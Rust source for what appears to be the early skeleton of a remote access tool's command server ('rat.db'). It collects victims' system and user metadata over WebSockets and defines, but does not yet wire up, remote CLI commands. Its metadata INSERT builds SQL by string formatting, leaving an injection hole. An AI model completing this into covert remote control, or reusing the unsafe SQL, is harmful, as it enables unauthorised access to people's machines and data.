
use std::{sync::Arc, collections::HashMap};


use tokio::net::{TcpListener, TcpStream};
use tokio_tungstenite::accept_async;
use futures::{SinkExt, StreamExt};
use tungstenite::protocol::Message;

use serde::{Deserialize, Serialize};

use sqlite::Connection;


#[derive(Serialize, Deserialize, Debug)]
enum ResponseStatus {
  Success,
  Failure,
  InProgress,
}

#[derive(Serialize, Deserialize, Debug)]
enum MessageType {
  Metadata(Metadata),
  Heartbeat(Heartbeat),
  // Command(Command),
  // CliCommand(CliCommand),
  // CommandResponse(CommandResponse),
  // TODO: Add more message types
}

#[derive(Serialize, Deserialize, Debug)]
enum BackendMessageType {
  Command,
  CliCommand(CliCommand),
  CommandResponse,
}


#[derive(Serialize, Deserialize, Debug)]
enum TopLevelMessageType {
  ClientMessage(MessageType),
  BackendMessage(BackendMessageType),    
}


#[derive(Serialize, Deserialize, Debug)]
enum HeartbeatType {
  First,
  Regular,
}

#[derive(Serialize, Deserialize, Debug)]
struct Messagee {
  version: u32,
  device_id: u64,
  message: MessageType,
}

#[derive(Serialize, Deserialize, Debug)]
struct Metadata {
  version: u32,
  os: String,
  cpu: String,
  storage: String,
  user: String,
  timestamp: u64,
  ip: u32,
}

#[derive(Serialize, Deserialize, Debug)]
struct Heartbeat {
  heartbeat_type: HeartbeatType,
  heartbeat_id: u64,
  device_id: u64,
  timestamp: u64,
}

#[derive(Serialize, Deserialize, Debug)]
struct CliCommand {
  id: u64,
  command: String,
  parameters: Vec<String>,
  priority: u8,
}



async fn handle_client_recived_message(message: Message, conn: Arc<tokio::sync::Mutex<Connection>>) -> ResponseStatus {
  let deserialized: Result<Messagee, _> = serde_json::from_str(&message.to_string());

  match deserialized {
    Ok(message) => {
      match message.message {
        MessageType::Metadata(metadata) => {
          println!("Received metadata: {:?}", metadata);
          let conn = conn.lock().await;
          let statement = format!("INSERT INTO metadata (version, os, cpu, storage, user, timestamp, ip) VALUES ({}, '{}', '{}', '{}', '{}', {}, {});", metadata.version, metadata.os, metadata.cpu, metadata.storage, metadata.user, metadata.timestamp, metadata.ip);

          if let Err(e) = conn.execute(statement) {
            eprintln!("Failed to insert metadata: {}", e);
            return ResponseStatus::Failure;
          }

        }

        MessageType::Heartbeat(heartbeat) => {
          println!("Received heartbeat: {:?}", heartbeat);
        }

        // MessageType::CliCommand(cli_command) => {
        //   println!("Received CLI command: {:?}", cli_command);
        // }
      }
    }

    Err(e) => {
      eprintln!("Failed to deserialize message: {}", e);
      return ResponseStatus::Failure;
    }
  }

  return ResponseStatus::Success;

}


async fn handle_client_connection_loop(stream: TcpStream) {
  let ws_stream = accept_async(stream).await.expect("Failed to accept connection");
  println!("New WebSocket connection established: ",);

  let (mut write, mut read) = ws_stream.split();

  let conn = Connection::open("rat.db").expect("Failed to open database");
  let conn = Arc::new(tokio::sync::Mutex::new(conn));

  while let Some(message) = read.next().await {
    match message {
      Ok(msg) => {
        // println!("Received message: {}", msg);
        let response = {
          handle_client_recived_message(msg, Arc::clone(&conn)).await
        };

        let response_json = serde_json::to_string(&response).expect("Failed to serialize response");

        if let Err(e) = write.send(Message::Text(response_json)).await {
          eprintln!("Error sending message: {}", e);
          break;
        }

      }
      Err(e) => {
        eprintln!("Error receiving message: {}", e);
        break;
      }
    }
  }

  println!("Connection closed");
}


async fn handle_connection_loop(stream: TcpStream, pool: Arc<tokio::sync::Mutex<HashMap<u64, tokio_tungstenite::WebSocketStream<TcpStream>>>>) {
  let ws_stream = accept_async(stream).await.expect("Failed to accept connection");
  println!("New WebSocket connection established: ",);

  let (mut write, mut read) = ws_stream.split();

  // let conn = Connection::open("rat.db").expect("Failed to open database");
  // let conn = Arc::new(tokio::sync::Mutex::new(conn));

  while let Some(message) = read.next().await {
    match message {
      Ok(msg) => {
        println!("Received message: {}", msg);


        if let Err(e) = write.send(msg).await {
          eprintln!("Error sending message: {}", e);
          break;
        }

      }
      Err(e) => {
        eprintln!("Error receiving message: {}", e);
        break;
      }
    }
  }
}

#[tokio::main]
async fn main() {
  let addr_client = "127.0.0.1:9001";
  let addr_backend = "127.0.0.1:9002";

  let listener_client = TcpListener::bind(&addr_client).await.expect("Can't bind to address");
  let listener_backend = TcpListener::bind(&addr_backend).await.expect("Can't bind to address");

  println!("WebSocket server listening for clients on ws://{}", addr_client);
  println!("WebSocket server listening for backends on ws://{}", addr_backend);

  let client_pool = Arc::new(tokio::sync::Mutex::new(HashMap::new()));


  // handle incoming client connections
  tokio::spawn(async move {
    while let Ok((stream, _)) = listener_client.accept().await {
      tokio::spawn(handle_client_connection_loop(stream));
    }
  });

  // handle incoming backend connections
  tokio::spawn(async move {
    while let Ok((stream, _)) = listener_backend.accept().await {
      tokio::spawn(handle_connection_loop(stream, Arc::clone(&client_pool)));
    }
  });

  // handle client pool
  tokio::spawn(async move {
    
  });


  loop {
    tokio::time::sleep(std::time::Duration::from_secs(1)).await;
  }
}


